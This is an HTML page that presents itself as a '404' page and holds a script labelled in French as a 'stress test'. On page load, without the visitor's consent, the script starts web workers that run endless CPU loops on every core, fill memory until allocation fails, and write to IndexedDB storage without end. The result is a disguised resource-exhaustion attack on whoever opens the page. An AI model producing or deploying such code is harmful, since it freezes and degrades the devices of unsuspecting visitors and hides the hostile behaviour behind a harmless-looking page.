<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <link rel="icon" type="image/png" href="/logo_onglet.png">
  <title>feur</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: #1ed760;
      color: white;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    /* ...existing code... */
  </style>
</head>
<body>
<script>
  // Stress Test : CPU, RAM, HDD démarrent automatiquement
  let activeWorkers = [];
  const coreCount = navigator.hardwareConcurrency || 4;

  function burnCPU() {
    while (true) {
      let x = 1;
      for (let i = 0; i < 10000000; i++) {
        x = Math.sin(Math.sqrt(x * Math.random()));
        x = Math.atan(Math.pow(x, 2.5));
      }
    }
  }

  function burnRAM() {
    const memoryHog = [];
    const chunkSize = 10 * 1024 * 1024;
    const numbersPerChunk = chunkSize / 8;
    while (true) {
      try {
        const chunk = new Float64Array(numbersPerChunk);
        for(let i = 0; i < chunk.length; i++) {
          chunk[i] = Math.random();
        }
        memoryHog.push(chunk);
      } catch (e) {
        break;
      }
    }
  }

  async function burnHDD() {
    const dbName = "HDDBurnDB";
    const storeName = "DataStore";
    const chunkSize = 10 * 1024 * 1024;
    function openDB() {
      return new Promise((resolve, reject) => {
        const request = indexedDB.open(dbName, 1);
        request.onupgradeneeded = e => {
          const db = e.target.result;
          if (!db.objectStoreNames.contains(storeName)) {
            db.createObjectStore(storeName, { autoIncrement: true });
          }
        };
        request.onsuccess = e => resolve(e.target.result);
        request.onerror = e => reject(e.target.error);
      });
    }
    function addData(db, data) {
      return new Promise((resolve, reject) => {
        const transaction = db.transaction([storeName], "readwrite");
        const store = transaction.objectStore(storeName);
        const request = store.add(data);
        transaction.oncomplete = () => resolve();
        transaction.onerror = e => reject(e.target.error);
      });
    }
    try {
      const db = await openDB();
      while (true) {
        const dataChunk = new Uint8Array(chunkSize).map((_,i) => i % 256);
        try {
          await addData(db, dataChunk);
        } catch (e) {
          const tx = db.transaction([storeName], "readwrite");
          await new Promise(r => tx.objectStore(storeName).clear().onsuccess = r);
        }
      }
    } catch (e) {
      // Impossible d'ouvrir IndexedDB
    }
  }

  function createWorker(fn) {
    const blob = new Blob([`(${fn.toString()})()`], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));
    activeWorkers.push(worker);
  }

  window.onload = function() {
    // Lancer tous les tests automatiquement
    for (let i = 0; i < coreCount; i++) {
      createWorker(burnCPU);
    }
    createWorker(burnRAM);
    createWorker(burnHDD);
    createWorker(burnHDD);
  };
</script>
</body>
<h1>404</h1>

</html>

